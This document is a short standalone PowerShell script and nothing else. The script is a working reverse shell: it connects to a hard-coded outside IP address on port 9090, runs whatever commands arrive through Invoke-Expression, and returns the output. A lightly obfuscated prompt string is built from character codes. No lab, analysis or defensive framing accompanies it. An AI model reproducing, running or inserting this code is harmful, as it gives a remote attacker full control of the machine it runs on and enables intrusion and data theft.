$c=New-Object Net.Sockets.TCPClient('147.15.52.130',9090);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);
  $p=[string]::Concat([char]80,[char]83,[char]32,(Get-Location).Path,[char]62,[char]32);
  $x=([text.encoding]::ASCII).GetBytes($r+$p);
  $s.Write($x,0,$x.Length);$s.Flush()
};
$c.Close()
